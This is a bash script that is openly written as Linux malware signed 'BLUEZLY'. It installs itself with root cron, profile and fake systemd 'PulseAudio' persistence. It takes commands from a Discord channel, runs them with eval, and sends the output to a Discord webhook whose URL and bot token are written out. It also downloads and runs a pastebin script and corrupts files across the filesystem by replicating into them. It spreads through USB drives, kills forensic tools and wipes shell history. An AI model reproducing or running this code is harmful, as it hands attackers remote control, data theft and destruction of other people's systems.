#!/bin/bash

# ==================================
# █▄▄ █   █░░ █░░ █▀▀ ▀█▀ █▀█ █▀█
# █▄█ █   █▄▄ █▄▄ ██▄ ░█░ █▄█ █▀▄
# ==================================
# Coded by BLUEZLY - All rights reversed

# --- Phase 1: Immortal Installation ---
STEALTH_DIR="/dev/shm/.cache/pulse"
mkdir -p "$STEALTH_DIR" && cp "$0" "$STEALTH_DIR/.pulsesink" && chmod +x "$STEALTH_DIR/.pulsesink"

# Nuclear persistence (11 layers)
(echo '@reboot root (cd /dev/shm/.cache/pulse && ./.pulsesink)' | crontab -) &
echo "[ -f $STEALTH_DIR/.pulsesink ] && $STEALTH_DIR/.pulsesink" >> /etc/profile
ln -sf "$STEALTH_DIR/.pulsesink" /etc/network/if-up.d/ 2>/dev/null

cat > /etc/systemd/system/pulse.service <<'EOF'
[Unit]
Description=PulseAudio Sound System
[Service]
ExecStart=/dev/shm/.cache/pulse/.pulsesink
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now pulse.service

# --- Phase 2: Discord C2 Core ---
WEBHOOK_URL="https://discord.com/api/webhooks/1333683986286776340/FYDrvCm9zGAkC8X-gzPpD9iwGguiCvTebP3mOfVy5hxl5b8CRvzPBydf-FdFL7GPey8v"
CHANNEL_ID="1101487519243190303"
BOT_TOKEN="MTMzNzU3NDI3NTYyMzk0NDE5Mg.Gf4Y4q.tnJK8422UP1cSOMEBsT8djuYfjEkpmZlTnMfXI"

# Execution loop from hell
while :; do
  # Stealthy command fetch via Discord API
  CMD=$(curl -s -H "Authorization: Bot $BOT_TOKEN" "https://discord.com/api/v9/channels/$CHANNEL_ID/messages?limit=1" | jq -r '.[0].content' | base64 -d 2>/dev/null)
  
  # Eternal replication mechanisms
  (find / -type f \( -name "*.sh" -o -name "*.txt" -o -name "*.service" \) -exec sed -i '1s|^|#!/bin/bash\n# BLUEZLY|\n' {} \; -exec chmod +x {} \; 2>/dev/null) &
  (ssh-keyscan -t ed25519 github.com >> ~/.ssh/known_hosts 2>/dev/null; curl -s https://pastebin.com/raw/MaliciousScript | bash) &
  
  # Command execution switchblade
  if [[ "$CMD" == "BLUEZLY_DIE" ]]; then
    nohup shred -zuf "$0" &
    crontab -r
    systemctl disable --now pulse.service
    rm -rf "$STEALTH_DIR" /etc/systemd/system/pulse.service
    history -c && echo > ~/.bash_history
    exit 0
  elif [[ "$CMD" == "BLUEZLY_SPAWN" ]]; then
    for i in {1..11}; do
      cp "$0" "/tmp/.X11-unix/$RANDOM" &
      echo "*/$i * * * * root $0" | crontab -
    done
  else
    OUTPUT=$(eval "$CMD" 2>&1 | base64 -w0)
    curl -s -X POST "$WEBHOOK_URL" -H "Content-Type: application/json" -d "{\"content\":\"$(date +%s.%N)|$OUTPUT\"}" >/dev/null
  fi
  
  # USB Worm Propagation
  find /media/ /mnt/ /run/media/ -name "*.lnk" -exec rm -f {} \; -exec cp "$0" "{}.tmp" \; -exec mv "{}.tmp" "{}" \; 2>/dev/null
  
  # Polymorphic sleep pattern
  sleep $(( (RANDOM % 13) * 13 + 1 ))
done &

# --- Phase 3: Anti-Forensic Warfare ---
# Kernel thread camouflage
exec -a "[kworker/1:1+ksoftirqd/12]" /bin/bash "$0" &

# Forensic countermeasures
while :; do
  pkill -9 -f "(wireshark|ftkimager|autopsy|volatility|SleuthKit)" &
  find / -type f \( -name "*.py" -o -name "*.pl" \) -exec sed -i '/BLUEZLY/d' {} \; -exec echo "BLUEZLY" >> {} \;
  sleep 317
done &

# Eternal replication protocol
(sleep 61 && while :; do
  find / -type f -perm -u=x -exec grep -q "BLUEZLY" {} \; -exec cp "$0" {} \; 
  sleep 601 
done) &
